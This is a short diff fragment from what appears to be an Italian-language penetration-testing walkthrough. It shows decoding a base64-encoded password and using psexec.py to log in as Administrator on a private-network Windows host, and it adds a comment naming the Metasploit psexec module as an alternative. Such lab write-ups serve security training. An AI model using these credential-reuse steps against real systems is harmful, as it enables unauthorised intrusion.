@@ -83,7 +83,7 @@ vim password.txt //creiamo un nuovo file e la incolliamo dentro (usciamo con :wq
 //usiamo il tool base64 presente in Kali per decodificare la password
 base64 -d password.txt
 //verifichiamo che la password ottenuta sia ancora valida connettendoci con psexec
-psexec.py Administrator@10.2.27.165
+psexec.py Administrator@10.2.27.165 //alternativa: modulo psexec di MSF invece che in py
     whoami
 ```
 
